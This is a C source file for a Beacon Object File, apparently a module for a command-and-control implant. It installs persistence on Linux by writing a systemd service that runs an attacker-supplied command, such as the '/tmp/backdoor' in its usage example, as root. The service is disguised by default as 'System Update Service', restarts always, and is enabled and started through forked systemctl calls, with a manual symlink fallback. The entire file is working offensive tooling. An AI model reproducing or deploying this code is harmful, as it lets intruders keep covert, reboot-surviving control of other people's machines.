#include "bof_api.h"

// Forward declarations
static int validate_service_name(const char *name);
static int find_systemctl(char *out_path, int out_size);
static int systemctl_operation(const char *systemctl_path, const char *operation, const char *service_name);

/* BOF entry point */
void go(char *args, int args_len) {
    datap parser;
    char *command;
    char *service_name;
    char *description;
    int command_len;
    int service_name_len;
    int description_len;

    BeaconDataParse(&parser, args, args_len);

    // Extract parameters
    command = BeaconDataExtract(&parser, &command_len);
    service_name = BeaconDataExtract(&parser, &service_name_len);
    description = BeaconDataExtract(&parser, &description_len);

    if (!command || command_len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Usage: persist_systemd <command> [service_name] [description]\n");
        BeaconPrintf(CALLBACK_ERROR, "[!] Example: persist_systemd \"/tmp/backdoor\" \"system-update\" \"System Update Service\"\n");
        return;
    }

    // Set default values
    if (!service_name || service_name_len <= 0 || AxStrcmp(service_name, "-") == 0) {
        service_name = "system-update";
    }
    if (!description || description_len <= 0 || AxStrcmp(description, "-") == 0) {
        description = "System Update Service";
    }

    // Validate service_name
    if (!validate_service_name(service_name)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Invalid service name: %s\n", service_name);
        BeaconPrintf(CALLBACK_ERROR, "[!] Allowed: [a-zA-Z0-9._-]\n");
        return;
    }

    // Check root privileges
    if (!BeaconIsAdmin()) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Root privileges required\n");
        return;
    }

    // Find systemctl
    char systemctl_path[256];
    if (!find_systemctl(systemctl_path, sizeof(systemctl_path))) {
        BeaconPrintf(CALLBACK_ERROR, "[!] systemctl not found on system\n");
        BeaconPrintf(CALLBACK_ERROR, "[!] Is systemd installed?\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[Persist Systemd] Creating service...\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[+] systemctl: %s\n", systemctl_path);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Command: %s\n", command);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Service: %s\n", service_name);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Description: %s\n", description);

    // Build service file path
    char service_path[512];
    AxSnprintf(service_path, sizeof(service_path), "/etc/systemd/system/%s.service", service_name);

    // Build service content with quoted ExecStart
    char service_content[4096];
    AxSnprintf(service_content, sizeof(service_content),
               "[Unit]\n"
               "Description=%s\n"
               "After=network.target\n\n"
               "[Service]\n"
               "Type=simple\n"
               "ExecStart=\"%s\"\n"
               "Restart=always\n"
               "RestartSec=60\n\n"
               "[Install]\n"
               "WantedBy=multi-user.target\n",
               description, command);

    // Create service file
    int service_fd = AxOpenFile(service_path, 577, 0644);

    if (service_fd < 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create service file: %s\n", service_path);
        BeaconPrintf(CALLBACK_ERROR, "[!] errno: %d\n", AxGetErrno());
        return;
    }

    int write_result = AxWriteFile(service_fd, service_content, AxStrlen(service_content));
    AxCloseFile(service_fd);

    if (write_result <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to write service file\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Service file created: %s\n", service_path);

    // Reload systemd daemon FIRST
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Reloading systemd daemon...\n");

    if (!systemctl_operation(systemctl_path, "daemon-reload", NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to reload systemd daemon\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Daemon reloaded\n");

    // Enable service
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Enabling service...\n");

    if (!systemctl_operation(systemctl_path, "enable", service_name)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] systemctl enable failed, creating symlink manually...\n");

        // Create symlink manually
        char link_path[512];
        AxSnprintf(link_path, sizeof(link_path), 
                   "/etc/systemd/system/multi-user.target.wants/%s.service", 
                   service_name);

        if (AxSymlink(service_path, link_path) == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Symlink created: %s\n", link_path);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to create symlink\n");
            return;
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Service enabled\n");
    }

    // Start service
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting service...\n");

    if (!systemctl_operation(systemctl_path, "start", service_name)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Could not start service (will start on reboot)\n");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Service started\n");
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Persistence created successfully\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Service: %s.service\n", service_name);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] File: %s\n", service_path);
}

/* Validate service name */
static int validate_service_name(const char *name) {
    if (!name || AxStrlen(name) <= 0) return 0;
    if (AxStrlen(name) > 255) return 0;

    for (int i = 0; name[i] != '\0'; i++) {
        char c = name[i];
        if (!((c >= 'a' && c <= 'z') ||
              (c >= 'A' && c <= 'Z') ||
              (c >= '0' && c <= '9') ||
              c == '.' || c == '_' || c == '-')) {
            return 0;
        }
    }

    if (AxStrstr(name, "..") || AxStrchr(name, '/') || AxStrchr(name, '\\')) {
        return 0;
    }

    return 1;
}

/* Find systemctl in common paths */
static int find_systemctl(char *out_path, int out_size) {
    const char *common_paths[] = {
        "/usr/bin/systemctl",
        "/bin/systemctl",
        "/usr/local/bin/systemctl",
        "/sbin/systemctl",
        "/usr/sbin/systemctl"
    };

    for (int i = 0; i < 5; i++) {
        unsigned int mode;
        long size;
        unsigned int uid, gid;

        if (AxFileStat(common_paths[i], &mode, &size, &uid, &gid) == 0) {
            if (mode & 0111) {  // Check if executable
                AxStrncpy(out_path, common_paths[i], out_size - 1);
                out_path[out_size - 1] = '\0';
                return 1;
            }
        }
    }

    return 0;
}

/* Execute systemctl operation */
static int systemctl_operation(const char *systemctl_path, const char *operation, const char *service_name) {
    int pid = AxFork();

    if (pid < 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Fork error: %d\n", AxGetErrno());
        return 0;
    }

    if (pid == 0) {
        // Child process
        char *argv[4];

        argv[0] = (char*)systemctl_path;
        argv[1] = (char*)operation;
        argv[2] = (char*)service_name;
        argv[3] = NULL;

        char *envp[] = { NULL };

        AxExecve(systemctl_path, argv, envp);

        // If execve fails
        AxKill(AxGetPid(), 9);
    }

    // Parent process
    int status;
    int wait_result = AxWaitpid(pid, &status, 0);

    if (wait_result != pid) {
        BeaconPrintf(CALLBACK_ERROR, "[!] waitpid error: %d\n", AxGetErrno());
        return 0;
    }

    return (WIFEXITED(status) && WEXITSTATUS(status) == 0);
}
